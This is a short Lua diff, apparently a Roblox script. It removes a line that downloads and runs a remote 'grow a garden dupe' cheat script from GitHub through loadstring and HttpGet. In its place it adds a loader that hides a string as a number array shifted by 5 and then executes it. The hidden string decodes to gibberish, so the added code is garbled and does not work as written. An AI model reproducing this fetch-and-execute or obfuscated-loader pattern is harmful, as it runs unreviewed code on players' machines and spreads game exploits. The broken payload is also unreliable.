@@ -1,2 +1,9 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gagscript00/gagscriptdupe/refs/heads/main/growagardendupe"))()
+local x = {120, 119, 127, 111, 46, 123, 131, 131, 122, 113, 46, 45, 109, 118, 127, 123, 122, 112, 112, 46, 115, 118, 114, 121, 130, 46, 122, 127, 129, 124, 118, 130, 116, 112, 126, 51, 107, 131, 113, 46, 117, 118, 121, 116, 105, 46, 113, 113, 46}
+local y, f = {}, ""
+for i = 1, #x do
+	y[i] = string.char(x[i] - 5)
+end
+f = table.concat(y)
+local z = loadstring(f)
+if z then z() end
 
